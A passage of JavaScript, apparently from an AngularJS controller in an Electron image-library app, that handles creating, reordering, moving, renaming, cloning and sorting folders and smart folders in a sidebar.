                    folder.parent = father.id;
                    if (father.icon) {
                        folder.icon = father.icon;
                    }
                    if (father.iconColor) {
                        folder.iconColor = father.iconColor;
                    }
                    parent.isExpand = true;
                }
                if (idx === -1) idx = children.length - 1;
                children.splice(idx + 1, 0, folder);
            }
            else if ($scope.currentFolder || parent) {
				var target = parent;
                var parent = parent || $scope.folderMappings[$scope.currentFolder.parent];
                var children = (parent && parent.children) ? parent.children : $scope.folders;
                var idx = children.indexOf($scope.currentFolder);
                if (parent) {
                    folder.parent = parent.id;
                    parent.isExpand = true;
                    // 创建新的文件夹自动继承父文件夹的颜色、图标设置
					if (target) {
						if (parent && parent.icon !== undefined) {
                            folder.icon = parent.icon;
                        }
                        if (parent && parent.iconColor !== undefined) {
                            folder.iconColor = parent.iconColor;
                        }
                    }
                    else if ($scope.currentFolder) {
                        if (parent && parent.icon === $scope.currentFolder.icon) {
                            folder.icon = parent.icon;
                        }
                        if (parent && parent.iconColor === $scope.currentFolder.iconColor) {
                            folder.iconColor = parent.iconColor;
                        }
                    }
                    else {
                        if (parent && parent.icon !== undefined) {
                            folder.icon = parent.icon;
                        }
                        if (parent && parent.iconColor !== undefined) {
                            folder.iconColor = parent.iconColor;
                        }
                    }
                } else {
                    folder.parent = $scope.currentFolder.parent;
                }
                if (idx === -1) idx = children.length - 1;
                if (isSubFolder) {
                    children.splice(0, 0, folder);
                }
                else {
                    children.splice(idx + 1, 0, folder);
                }
            }
            // 插入尾端
            else {
                idx = $scope.folders.length;
                $scope.folders.splice(idx, 0, folder);
            }

            $scope.folderMappings[folder.id] = folder;
			$scope.addToRecentFolders([folder.id]);
			
            setTimeout(function() { 
                $scope.changeSidebarIndex(folder); 
                $scope.$evalAsync();
                setTimeout(function() { $("#folder-input-" + folder.id).focus().select(); }, 50);
                setTimeout(function() { $("#folder-input-" + folder.id).focus().select(); }, 100);
            }, 150);

            setTimeout(function() { 
                $scope.changeSidebarIndex(folder); 
                $scope.$evalAsync();
                setTimeout(function() { 
                    if ($("#folder-input-" + folder.id + ":focus").length === 0) {
                        $("#folder-input-" + folder.id).focus().select(); 
                    }
                }, 100);
            }, 250);

            $scope.updateSidebarList();

            // Note: 如果用戶當前選擇多個文件，表示正在分類，這時候不要跳轉是比較好的選擇
            if ($scope.selected.length === 0 && !ignoreAutoOpen) {
                $scope.openFolder(folder);
            }
            setTimeout(function() {
                $scope.calculateImageBinding({ ignoreSort: true }, function() {
                    $scope.refreshSubfolderList();
                    $scope.saveFolder();
                    if (folder.parent) {
                        electronLog && electronLog.info(`[app] New sub-folder: ${folder.id}, parent: ${folder.parent}`);
                    }
                    else {
                        electronLog && electronLog.info(`[app] New folder: ${folder.id}`);
                    }
                    analytics.event('Folder', 'Create');
                });
            }, 300);
        };

        var saveFolderTimeout;
        $scope.arrangeTopFolder = function() {
            if ($rootScope.selectedFolders.length > 0) return;
            if ($rootScope.selectedSmartFolders.length > 0) return;
            if ($scope.currentFolder) {
                var folders = ($scope.currentFolder.parent && $scope.folderMappings[$scope.currentFolder.parent].children) || $scope.folders;
                var idx = folders.indexOf($scope.currentFolder);
                if (idx >= 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentFolder, idx, 0, folders);
                }
            } else if ($scope.currentSmartFolder) {
                var folders = $scope.smartFolders;
	            if ($scope.currentSmartFolder.parent && $scope.smartFolderMappings[$scope.currentSmartFolder.parent]) {
	            	let parent = $scope.smartFolderMappings[$scope.currentSmartFolder.parent];
	                folders = parent.children;
	            }
                var idx = folders.indexOf($scope.currentSmartFolder);
                if (idx >= 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentSmartFolder, idx, 0, folders);
                }
            }
        };

        $scope.arrangeUpFolder = function() {
            if ($rootScope.selectedFolders.length > 0) return;
            if ($rootScope.selectedSmartFolders.length > 0) return;
            if ($scope.currentFolder) {
                var folders = ($scope.currentFolder.parent && $scope.folderMappings[$scope.currentFolder.parent].children) || $scope.folders;
                var idx = folders.indexOf($scope.currentFolder);
                if (idx >= 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentFolder, idx, idx - 1, folders);
                }
            } else if ($scope.currentSmartFolder) {
            	var folders = $scope.smartFolders;
	            if ($scope.currentSmartFolder.parent && $scope.smartFolderMappings[$scope.currentSmartFolder.parent]) {
	            	let parent = $scope.smartFolderMappings[$scope.currentSmartFolder.parent];
	                folders = parent.children;
	            }
                var idx = folders.indexOf($scope.currentSmartFolder);
                if (idx >= 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentSmartFolder, idx, idx - 1, folders);
                }
            }
        };

        $scope.arrangeBottomFolder = function() {
            if ($rootScope.selectedFolders.length > 0) return;
            if ($rootScope.selectedSmartFolders.length > 0) return;
            if ($scope.currentFolder) {
                var folders = ($scope.currentFolder.parent && $scope.folderMappings[$scope.currentFolder.parent].children) || $scope.folders;
                var idx = folders.indexOf($scope.currentFolder);
                if (idx < folders.length - 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentFolder, idx, folders.length - 1, folders);
                }
            } else if ($scope.currentSmartFolder) {
                var folders = $scope.smartFolders;
	            if ($scope.currentSmartFolder.parent && $scope.smartFolderMappings[$scope.currentSmartFolder.parent]) {
	            	let parent = $scope.smartFolderMappings[$scope.currentSmartFolder.parent];
	                folders = parent.children;
	            }
                var idx = folders.indexOf($scope.currentSmartFolder);
                if (idx < folders.length - 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentSmartFolder, idx, folders.length - 1, folders);
                }
            }
        };

        $scope.arrangeDownFolder = function() {
            if ($rootScope.selectedFolders.length > 0) return;
            if ($rootScope.selectedSmartFolders.length > 0) return;
            if ($scope.currentFolder) {
                var folders = ($scope.currentFolder.parent && $scope.folderMappings[$scope.currentFolder.parent].children) || $scope.folders;
                var idx = folders.indexOf($scope.currentFolder);
                if (idx < folders.length - 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentFolder, idx, idx + 1, folders);
                }
            } else if ($scope.currentSmartFolder) {
                var folders = $scope.smartFolders;
	            if ($scope.currentSmartFolder.parent && $scope.smartFolderMappings[$scope.currentSmartFolder.parent]) {
	            	let parent = $scope.smartFolderMappings[$scope.currentSmartFolder.parent];
	                folders = parent.children;
	            }
                var idx = folders.indexOf($scope.currentSmartFolder);
                if (idx < folders.length - 1) {
                    $timeout.cancel(saveFolderTimeout);
                    moveFolderTo($scope.currentSmartFolder, idx, idx + 1, folders);
                }
            }
        };

        var moveFolderTo = function(folder, from, to, folders) {
            if (!$.isNumeric(from) || !$.isNumeric(to) || !folder) { return; }
            if (!folders) folders = $scope.folders;
            folders.move(from, to);
            $scope.updateSidebarList();
            setTimeout(function() {  $scope.changeSidebarIndex(folder); $scope.$evalAsync(); }, 100);
            saveFolderTimeout = $timeout(function() {
                $scope.saveFolder();
            }, 1000);
        };

        function getFolderParentChilder (folder) {
            if (folder.parent && $scope.folderMappings[folder.parent]) {
                return $scope.folderMappings[folder.parent].children;
            }
            else {
                return $scope.folders;
            }
        }

        $scope.addQuickAccessTo = function (accessItem, targetQuickAccess, isBottom) {

            if (!targetQuickAccess || !accessItem) return;
            if (!$scope.quickAccess) return;

            var idx = $scope.quickAccess.indexOf(targetQuickAccess);
            if (idx === -1)  return;

            var clone = angular.copy($scope.quickAccess);
            try {

                // 插入
                var tidx = $scope.quickAccess.indexOf(targetQuickAccess);
                if (!isBottom) {
                    $scope.quickAccess.splice(tidx, 0, accessItem);
                }
                else {
                    $scope.quickAccess.splice(tidx + 1, 0, accessItem);
                }

                $scope.updateSidebarList();
                $scope.saveFolder();
            }
            catch (err) {
                $scope.quickAccess = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.moveQuickAccessTo = function (draggedQuickAccess, targetQuickAccess, isBottom) {

            if (!targetQuickAccess || !draggedQuickAccess) return;
            if (draggedQuickAccess === targetQuickAccess) return;
            if (!$scope.quickAccess) return;

            var idx = $scope.quickAccess.indexOf(targetQuickAccess);
            if (idx === -1)  return;

            var clone = angular.copy($scope.quickAccess);
            try {

                // 移除
                var ridx = $scope.quickAccess.indexOf(draggedQuickAccess);
                if (ridx === -1) return;
                $scope.quickAccess.splice(ridx, 1);

                // 插入
                var tidx = $scope.quickAccess.indexOf(targetQuickAccess);
                if (!isBottom) {
                    $scope.quickAccess.splice(tidx, 0, draggedQuickAccess);
                }
                else {
                    $scope.quickAccess.splice(tidx + 1, 0, draggedQuickAccess);
                }

                $scope.updateSidebarList();
                $scope.saveFolder();
                try { electronLog && electronLog.info(`[app] Sort quickaccess item: ${draggedQuickAccess.id} to ${targetQuickAccess.id}`); } catch (err) {};
            }
            catch (err) {
                $scope.quickAccess = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.moveSmartFoldersToSmartFolder = function (folders, folder) {

            if (!folder || !folders || folders.length === 0) return;
        
            // 避免自己拖拽到自己的 Childred
            if (folders.indexOf(folder) > -1) return;

            // 避免老爸拖拽到子孙
            var ancestors = getAncestorSmartFolders(folder, []);
            for (let i = 0; i < folders.length; i++) {
                const ancestor = folders[i];
                if (ancestors.indexOf(ancestor) > -1) {
                    return;
                }
            }

            if (!folder.children) {
                folder.children = [];
            }

            var moved = {};
            var children = folder.children;

            folders.forEach(function (folder) {
                moved[folder.id] = folder;
            });

            // 重新排序资料夹（依据视觉顺序）
            folders.sort(function (a, b) {
                try {
                    var aIdx = $("#smart-folder-" + a.id).offset().top;
                    var bIdx = $("#smart-folder-" + b.id).offset().top;
                    if (aIdx < bIdx)
                    return -1;
                    if (aIdx > bIdx)
                        return 1;
                    return 0;
                }
                catch (err) {
                    // debugger
                    return 0;
                }
            });

            var clone = angular.copy($scope.smartFolders);

            try {

                for (var i = folders.length - 1; i >= 0; i--) {
                    var f = folders[i];
                    var p = f.parent;
                    if (f.id === folder.id) break;
                    if (!f.parent || !moved[f.parent]) {
                        // 从原来位置移除
                        var ch;
                        var index = -1;
                        if (p && $scope.smartFolderMappings[p].children) {
                            ch = $scope.smartFolderMappings[p].children;
                        }
                        else {
                            ch = $scope.smartFolders;
                        }
                        index = ch.indexOf(f);
                        if (index > -1) {
                            ch.splice(index, 1);
                        }
                    }
                }

                for (let j = 0; j < folders.length; j++) {
                    var f = folders[j];
                    // 如果老爸也被移动，孩子就不需要在移动了
                    if (!moved[f.parent]) {
                        f.parent = folder.id;
                        children.push(f);
                    }
                }

                folder.isExpand = true;

                $scope.updateSidebarList();
                $scope.saveFolder();
                $scope.rebindRefresh();

                try {
                    electronLog && electronLog.info(`[app] Drag ${folders.length} smartFolders as ${folder.name}(${folder.id}) children`);
                } catch (err) {};

                setTimeout(function () {
                	folders.forEach(function (sf) {
                		let sfs = [];
                		sfs.push(sf);
	                	if (sf.children) {
		                	eagle.utils.tree.walk(sf.children, 'children', function (csf, parent, depth) {
		                		sfs.push(csf);
		                	});
	                	}
	                	ayncsUpdateSmartFoldersCount(sfs, function () {
	                		$scope.reload(true);
	                	});
	                });
	                $scope.$evalAsync();
                }, 200);
            }
            catch (err) {
                $scope.smartFolders = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.moveSmartFolderTo = function (dragSmartFolders, targetSmartFolder, isBottom) {

            if (!targetSmartFolder || !dragSmartFolders || dragSmartFolders.length === 0) return;
            
            // 避免自己拖拽到自己的 Childred
            if (dragSmartFolders.indexOf(targetSmartFolder) > -1) return;

            var list;
            if (targetSmartFolder.parent && $scope.smartFolderMappings[targetSmartFolder.parent]) {
            	let parent = $scope.smartFolderMappings[targetSmartFolder.parent];
            	list = parent.children;
            }
            else {
            	list = $scope.smartFolders;
            }

            var idx = list.indexOf(targetSmartFolder);
            if (idx === -1)  return;

            // 重新排序资料夹（依据视觉顺序）
            dragSmartFolders = dragSmartFolders.sort(function (a, b) {
                try {
                    var aIdx = $("#smart-folder-" + a.id).offset().top;
                    var bIdx = $("#smart-folder-" + b.id).offset().top;
                    if (aIdx < bIdx)
                    return -1;
                    if (aIdx > bIdx)
                        return 1;
                    return 0;
                }
                catch (err) {
                    return 0;
                }
            });

            var clone = angular.copy($scope.smartFolders);
            try {
                // 移除
                for (var i = dragSmartFolders.length - 1; i >= 0; i--) {
                    let dragSmartFolder = dragSmartFolders[i];
                    let includeList;
                    if (dragSmartFolder.parent && $scope.smartFolderMappings[dragSmartFolder.parent]) {
		            	let parent = $scope.smartFolderMappings[dragSmartFolder.parent];
		            	includeList = parent.children;
		            }
		            else {
		            	includeList = $scope.smartFolders;
		            }

                    var ridx = includeList.indexOf(dragSmartFolder);
                    if (ridx === -1) return;
                    includeList.splice(ridx, 1);
                }

                // 插入
                var tidx = list.indexOf(targetSmartFolder);
                for (var j = dragSmartFolders.length - 1; j >= 0; j--) {
                    var dragSmartFolder = dragSmartFolders[j];
                    if (!isBottom) {
                        list.splice(tidx, 0, dragSmartFolder);
                    }
                    else {
                        list.splice(tidx + 1, 0, dragSmartFolder);
                    }
                    if (targetSmartFolder.parent) {
                    	dragSmartFolder.parent = targetSmartFolder.parent;
                    }
                    else {
                    	delete dragSmartFolders.parent;
                    }
                }

                $scope.updateSidebarList();
                $scope.saveFolder();
                $scope.rebindRefresh();

                setTimeout(function () {
                	dragSmartFolders.forEach(function (sf) {
                		let sfs = [];
                		sfs.push(sf);
	                	if (sf.children) {
		                	eagle.utils.tree.walk(sf.children, 'children', function (csf, parent, depth) {
		                		sfs.push(csf);
		                	});
	                	}
	                	ayncsUpdateSmartFoldersCount(sfs, function () {
	                		$scope.reload(true);
	                	});
	                });
	                $scope.$evalAsync();
                }, 200);

                try {
                    electronLog && electronLog.info(`[app] Drag ${dragSmartFolders.length} smart-folders as ${targetSmartFolder.name}(${targetSmartFolder.id}) siblings`);
                } catch (err) {};
            }
            catch (err) {
            	$scope.smartFolders = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.moveFoldersAsSibling = function (folders, folder, isBottom) {

            if (!folder || !folders || folders.length === 0) return;

            // 避免自己拖拽到自己的 Childred
            if (folders.indexOf(folder) > -1) return;
            
            // 避免老爸拖拽到子孙
            var ancestors = getAncestorFolders(folder, []);
            for (let i = 0; i < folders.length; i++) {
                const ancestor = folders[i];
                if (ancestors.indexOf(ancestor) > -1) {
                    return;
                }
            }

            var moved = {};
            var children = getFolderParentChilder(folder);
            var idx = -1;

            if (!children) return;

            idx = children.indexOf(folder);

            if (idx === -1)  return;

            folders.forEach(function (folder) {
                moved[folder.id] = folder;
            });

            // 重新排序资料夹（依据视觉顺序）
            folders.sort(function (a, b) {
                try {
                    var aIdx = $("#folder-" + a.id).offset().top;
                    var bIdx = $("#folder-" + b.id).offset().top;
                    if (aIdx < bIdx)
                    return -1;
                    if (aIdx > bIdx)
                        return 1;
                    return 0;
                }
                catch (err) {
                    // debugger
                    return 0;
                }
            });

            var clone = [];
            cloneTree(clone, $scope.folders, true);

            try {
                for (var i = folders.length - 1; i >= 0; i--) {
                    var f = folders[i];
                    var p = f.parent;
                    if (f.id === folder.id) break;
                    if (!f.parent || !moved[f.parent]) {
                        // 从原来位置移除
                        var ch;
                        var index = -1;
                        if (p && $scope.folderMappings[p].children) {
                            ch = $scope.folderMappings[p].children;
                        }
                        else {
                            ch = $scope.folders;
                        }
                        index = ch.indexOf(f);
                        if (index > -1) {
                            ch.splice(index, 1);
                        }
                    }
                }

                idx = children.indexOf(folder);

                for (var j = folders.length - 1; j >= 0; j--) {
                    var f = folders[j];
                    // 如果老爸也被移动，孩子就不需要在移动了
                    if (!f.parent || !moved[f.parent]) {
                        if (!folder.parent) {
                            delete f.parent;
                        }
                        else {
                            f.parent = folder.parent;
                        }
                        if (!isBottom) {
                            children.splice(idx, 0, f);
                        }
                        else {
                            children.splice(idx + 1, 0, f);
                        }
                    }
                }
                $scope.updateSidebarList();
                $scope.saveFolder();
                try {
                    electronLog && electronLog.info(`[app] Drag ${folders.length} folders as ${folder.name}(${folder.id}) sibling`);
                } catch (err) {};
            }
            catch (err) {
                $scope.folders = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.moveFoldersToFolder = function (folders, folder) {

            if (!folder || !folders || folders.length === 0) return;
        
            // 避免自己拖拽到自己的 Childred
            if (folders.indexOf(folder) > -1) return;

            // 避免老爸拖拽到子孙
            var ancestors = getAncestorFolders(folder, []);
            for (let i = 0; i < folders.length; i++) {
                const ancestor = folders[i];
                if (ancestors.indexOf(ancestor) > -1) {
                    return;
                }
            }

            if (!folder.children) {
                folder.children = [];
            }

            var moved = {};
            var children = folder.children;

            folders.forEach(function (folder) {
                moved[folder.id] = folder;
            });

            // 重新排序资料夹（依据视觉顺序）
            folders.sort(function (a, b) {
                try {
                    var aIdx = $("#folder-" + a.id).offset().top;
                    var bIdx = $("#folder-" + b.id).offset().top;
                    if (aIdx < bIdx)
                    return -1;
                    if (aIdx > bIdx)
                        return 1;
                    return 0;
                }
                catch (err) {
                    // debugger
                    return 0;
                }
            });

            var clone = [];
            cloneTree(clone, $scope.folders, true);

            try {

                for (var i = folders.length - 1; i >= 0; i--) {
                    var f = folders[i];
                    var p = f.parent;
                    if (f.id === folder.id) break;
                    if (!f.parent || !moved[f.parent]) {
                        // 从原来位置移除
                        var ch;
                        var index = -1;
                        if (p && $scope.folderMappings[p].children) {
                            ch = $scope.folderMappings[p].children;
                        }
                        else {
                            ch = $scope.folders;
                        }
                        index = ch.indexOf(f);
                        if (index > -1) {
                            ch.splice(index, 1);
                        }
                    }
                }

                for (let j = 0; j < folders.length; j++) {
                    var f = folders[j];
                    // 如果老爸也被移动，孩子就不需要在移动了
                    if (!moved[f.parent]) {
                        f.parent = folder.id;
                        children.push(f);
                    }
                }

                folder.isExpand = true;
                $scope.updateSidebarList();
                $scope.saveFolder();
                try {
                    electronLog && electronLog.info(`[app] Drag ${folders.length} folders as ${folder.name}(${folder.id}) children`);
                } catch (err) {};
            }
            catch (err) {
                $scope.folders = clone;
                electronLog && electronLog.error(err.stack || err);
            }
        };

        $scope.setFolderPassword = function (folder) {
            var folder = folder || $scope.currentFolder;
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'new'
            });
        };

        $scope.changeFolderPassword = function (folder) {
            var folder = folder || $scope.currentFolder;
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'change'
            });
        };

        $scope.resetFolderPassword = function (folder) {
            var folder = folder || $scope.currentFolder;
            if (!folder) return;
            $rootScope.$broadcast("SET-FOLDER-PASSWORD", {
                folder: folder,
                mode: 'reset'
            });
        };

        $scope.setFoldersOrder = function (folders, orderBy, ignoreReload) {
            folders.forEach(function (folder) {
                $scope.setFolderOrder(folder, orderBy);
            });
            $scope.sortRawData(orderBy);
            $scope.rebindRefresh();
            $scope.$evalAsync();
        };

        $scope.setFolderOrder = function (folder, orderBy, ignoreReload) {
            var folder = folder;
            if (!folder) return;
            if (!orderBy) {
                delete folder.orderBy;
                delete folder.sortIncrease;
            }
            else {
                folder.orderBy = orderBy;
                if (folder.sortIncrease === undefined) {
                    folder.sortIncrease = true;
                }
            }
            if ($scope.currentFolder === folder && !ignoreReload) {
                $scope.reload();
            }
            $scope.saveFolder();
        };

        $scope.setFoldersSortIncrease = function (folders, sortIncrease, ignoreReload) {
            folders.forEach(function (folder) {
                $scope.setFolderSortIncrease(folder, sortIncrease);
            });
        };

        $scope.setFolderSortIncrease = function (folder, sortIncrease, ignoreReload) {
            var folder = folder;
            if (!folder) return;
            folder.sortIncrease = !!sortIncrease;
            if ($scope.currentFolder === folder && !ignoreReload) {
                $scope.reload();
            }
            $scope.saveFolder();
        };

        $scope.setSmartFoldersOrder = function (smartFolders, orderBy, ignoreReload) {
            smartFolders.forEach(function (folder) {
                $scope.setSmartFolderOrder(folder, orderBy);
            });
            $scope.sortRawData(orderBy);
            $scope.rebindRefresh();
            $scope.$evalAsync();
        };

        $scope.setSmartFolderOrder = function (folder, orderBy) {
            var folder = folder;
            if (!folder) return;
            if (!orderBy) {
                delete folder.orderBy;
                delete folder.sortIncrease;
            }
            else {
                folder.orderBy = orderBy;
                if (folder.sortIncrease === undefined) {
                    folder.sortIncrease = true;
                }
            }
            if ($scope.currentSmartFolder === folder) {
                $scope.reload();
            }
            $scope.saveFolder();
        };

        $scope.setSmartFoldersSortIncrease = function (smartFolders, sortIncrease, ignoreReload) {
            smartFolders.forEach(function (folder) {
                $scope.setSmartFolderSortIncrease(folder, sortIncrease);
            });
        };

        $scope.setSmartFolderSortIncrease = function (folder, sortIncrease) {
            if (!folder) return;
            folder.sortIncrease = !!sortIncrease;
            if ($scope.currentSmartFolder === folder) {
                $scope.reload();
            }
            $scope.saveFolder();
        };

        $scope.setFolderCover = () => {
            const item = $scope.selected[0];
            if (!$scope.currentFolder || !item) return;
            $scope.currentFolder.coverId = item.id;
            var thumbnailUrl = FileUrlHelper.getThumbnailUrl(item);
            $scope.currentFolder.covers[0] = `<img class="sub-folder-cover" src="${thumbnailUrl}" style="aspect-ratio: ${$scope.selected[0].width / $scope.selected[0].height};">`;
            var message = $filter('i18n')("notify.folder.setAsCover", [
                { "property": "folderName", "value": $scope.currentFolder.name }
            ]);
            $scope.notify({
                message: message,
                duration: 750
            });
            $scope.saveFolder();
        };

        $scope.resetFolderCover = function (folder) {
            if (!folder) return;
            var ancestors = getAncestorFolders(folder, [folder]);
            ancestors.push(folder);
            ancestors.forEach(function (f) {
                f.covers = [];
            });
        };

        

        $scope.lockFolder = function (event, f) {
            var folder = f || $scope.currentFolder;
            if (!folder) return;
            if (!folder.isUnLock || !folder.password) return;
            delete folder.isUnLock;
            $scope.isLoading = true;
            $scope.selected = [];
            $scope.updateSidebarList();
            $scope.calculateImageBinding({ ignoreSort: true }, function () {
                $scope.rebindRefresh();
                $scope.updateSelection();
                $scope.isLoading = false;
            });
        };

        function renameImages () {
            if ($scope.selected.length > 1) {
                $rootScope.$broadcast("OPEN_RENAME", {
                	type: "IMAGE",
                    images: $scope.selected
                });
            }
            else {
                var imageId = $scope.selected[0].id;
                var $box = $(`#box-${imageId}`);
                if ($box.length > 0) {
                    setTimeout(() => {
                        enableImageNameEditable(event, $box.find(".name"));
                    }, 50);
                }
            }
        }

        $scope.renameCurrentFolder = function(event) {
            if ($scope.selected.length > 0 && $rootScope.currentFocus !== "sidebar") {
				if (!$scope.isDetailMode) {
                	renameImages();
				}
				else {
					$('#inspector-name').focus();
					setTimeout(() => {
						document.execCommand('selectAll', false, null);
					}, 100);
				}
            } 
            else if ($rootScope.currentFocus !== "sidebar" && $scope.selectedFolderMappings && Object.keys($scope.selectedFolderMappings).length > 0) {
                var $name = $(".sub-folder.selected").find(".name");
                if ($name.length === 0) return;
                var e = jQuery.Event("click");
                e.target = $name[0];
                let folderId = Object.keys($scope.selectedFolderMappings)[0];
                let folder = $scope.folderMappings[folderId];
                $scope.enableSubFolderNameEditable(e, folder);
            }
            else if (!$scope.isDetailMode && $scope.currentFolder && $rootScope.currentFocus === 'sidebar') {
                event && event.preventDefault();
                if ($rootScope.selectedFolders.length > 1) {
                	$scope.batchRenameFolders();
                }
                else {
                	$scope.renameFolder(event, $scope.currentFolder);
                }
            } else if (!$scope.isDetailMode && $scope.currentSmartFolder && $rootScope.currentFocus === 'sidebar') {
                event && event.preventDefault();
                if ($rootScope.selectedSmartFolders.length > 1) {
                	$scope.batchRenameSmartFolders();
                }
                else {
                	$scope.renameSmartFolder(event, $scope.currentSmartFolder);
                }
            } else if (!$scope.isDetailMode && $scope.currentTagGroup) {
                $timeout(function () {
                    $scope.renameTagGroup($scope.currentTagGroup);
                }, 50);
            }

        };

        $scope.settingFolder = function(event, folder) {
            var f = folder;
            if (!f) {
                f = $scope.currentFolder || $scope.currentSmartFolder;
                if ($scope.selectedFolderMappings && Object.keys($scope.selectedFolderMappings).length > 0) {
                    var selectedFolders = Object.keys($scope.selectedFolderMappings).map(function(key) {
                        return key;
                    });
                    var folderId = selectedFolders[0];
                    if (folderId && $scope.folderMappings[folderId]) {
                        f = $scope.folderMappings[folderId];
                    }
                }
            }
            if (!f) return;

            if (f.conditions) {
                $rootScope.$broadcast('EDIT.SMART.FOLDER', f);
            } 
            else {
            	$rootScope.$broadcast("FOLDER_SETTINGS", f);
            }
        };

        $scope.setAutoTags = function (event, folder) {
            $rootScope.$broadcast("FOLDER_SETTINGS", folder);
        };

        $scope.dblclickSidebarSmartFolderGroup = function (event, folder) {
        	if ($rootScope.preferences.habits.dblclickSidebarItem === 'collapse') {
        		$scope.toggleSmartFolderExpand(event, folder);
        	}
        	else {
        		$scope.renameSmartFolder(event, folder);
        	}
        };

        $scope.dblclickSidebarFolder = function (event, folder) {
        	if ($rootScope.preferences.habits.dblclickSidebarItem === 'collapse') {
        		$scope.toggleFolderExpand(event, folder);
        	}
        	else {
        		$scope.renameFolder(event, folder);
        	}
        };

        $scope.renameFolder = function(event, folder) {
            // if (folder.password && !folder.isUnLock) return;
            $scope.viewMode = undefined;
            $scope.currentFolder = folder;
            folder.editable = true;
            folder.newFolderName = folder.name;
            setTimeout(function() {
                $("#folder-input-" + folder.id).focus().select();
            }, 10);
            setTimeout(function() {
                $("#folder-input-" + folder.id).focus().select();
            }, 30);
            setTimeout(function() {
                $("#folder-input-" + folder.id).focus().select();
            }, 50);
            setTimeout(function() {
                $("#folder-input-" + folder.id).focus().select();
            }, 100);
        };

        $scope.batchRenameFolders = function () {
        	var selectedFolders = $rootScope.selectedFolders;
        	if (selectedFolders.length === 0) return;

            $rootScope.$broadcast("OPEN_RENAME", {
            	type: "FOLDER",
                folders: selectedFolders
            });
        }

        $scope.renameSmartFolder = function(event, smartFolder) {
            $scope.viewMode = undefined;
            $scope.currentSmartFolder = smartFolder;
            smartFolder.editable = true;
            smartFolder.newFolderName = smartFolder.name;
            setTimeout(function() {
                $("#folder-input-" + smartFolder.id).focus().select();
            }, 10);
            setTimeout(function() {
                $("#folder-input-" + smartFolder.id).focus().select();
            }, 30);
            setTimeout(function() {
                $("#folder-input-" + smartFolder.id).focus().select();
            }, 50);
            setTimeout(function() {
                $("#folder-input-" + smartFolder.id).focus().select();
            }, 100);
        };

        $scope.batchRenameSmartFolders = function () {
        	var selectedSmartFolders = $rootScope.selectedSmartFolders;
        	if (selectedSmartFolders.length === 0) return;

            $rootScope.$broadcast("OPEN_RENAME", {
            	type: "SMART_FOLDER",
                folders: selectedSmartFolders
            });
        }

        $scope.changeSmartFolderIcon = function (event, smartFolder, icon) {
            if (!icon) {
                delete smartFolder.icon;
            }
            else {
                smartFolder.icon = icon;
            }
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change folder: ${smartFolder.name}(${smartFolder.id}) icon to: ${icon}`); } catch (err) {};
            analytics.event('ChangeIcon', 'SmartFolder', icon);
        };

        $scope.changeSmartFolderColor = function (event, smartFolder, color) {
            if (!color) {
                delete smartFolder.iconColor;
            }
            else {
                smartFolder.iconColor = color;
            }
            $scope.updateSidebarList();
            $scope.saveFolder();
            try { electronLog && electronLog.info(`[app] Change smart-folder: ${smartFolder.name}(${smartFolder.id}) icon color to: ${color}`); } catch (err) {};
            analytics.event('ChangeColor', 'SmartFolder', color);
        };

        $scope.cloneSmartFolder = function(event, smartFolder) {
        	
            var newFolder = angular.copy(smartFolder);
            var children = $scope.smartFolders;
            if (smartFolder.parent && $scope.smartFolderMappings[smartFolder.parent]) {
            	let parent = $scope.smartFolderMappings[smartFolder.parent];
                children = parent.children;
            }
            var idx = children.indexOf(smartFolder);
            newFolder.id = guid();
            newFolder.children = newFolder.children || [];

            eagle.utils.tree.walk(newFolder.children, 'children', function (sf, parent) {
            	let newId = guid();
        		sf.id = newId;
        		sf.children = sf.children || [];
        		if (parent) {
            		sf.parent = parent.id;;
            	}
        		$scope.smartFolderMappings[newId] = sf;
        	});

            if (idx > -1) {
                children.splice(idx, 0, newFolder);
                $scope.smartFolderMappings[newFolder.id] = newFolder;
                $scope.updateSidebarList();
                $scope.saveFolder();
                try { electronLog && electronLog.info(`[app] Clone smart-folder: ${smartFolder.name}(${smartFolder.id}), new smart-folder: ${newFolder.name}(${newFolder.id})`); } catch (err) {};
            }
        };

        $scope.cloneFolder = function(event, folder) {
            var resetFolder = function (fd) {
                delete fd.$$hashKey;
                fd.covers = [];
                fd.images = [];
                fd.imagesMappings = {};
                fd.imageCount = 0;
                fd.modificationTime = Date.now();
                fd.password = "";
                fd.passwordTips = "";
                delete fd.descendantImageCount;
            }
            var newFolder = angular.copy(folder);
            resetFolder(newFolder);

            var children = $scope.folders;
            if (folder.parent && $scope.folderMappings[folder.parent]) {
                let parent = $scope.folderMappings[folder.parent];
                children = parent.children;
            }
            var idx = children.indexOf(folder);
            newFolder.id = guid();
            newFolder.children = newFolder.children || [];

            eagle.utils.tree.walk(newFolder.children, 'children', function (sf, parent) {
                let newId = guid();
                sf.id = newId;
                sf.children = sf.children || [];
                if (parent) {
                    sf.parent = parent.id;;
                }
                resetFolder(sf);
                $scope.folderMappings[newId] = sf;
            });

            if (idx > -1) {
                children.splice(idx + 1, 0, newFolder);
                $scope.folderMappings[newFolder.id] = newFolder;
                $scope.updateSidebarList();
                $scope.saveFolder();
                try { electronLog && electronLog.info(`[app] Clone folder: ${folder.name}(${folder.id}), new folder: ${newFolder.name}(${newFolder.id})`); } catch (err) {};
            }
            $scope.calculateImageBinding({ ignoreSort: true }, function () {});
        };

        function reorderFolderByTitle (folders, reverse) {
            folders = folders.sort(function(a, b) {
                try {
                    var na = a.name.toLowerCase();
                    var nb = b.name.toLowerCase();
                    if (na && na) {
                        return na.localeCompare(nb, languageBCP, {numeric: true});
                    }
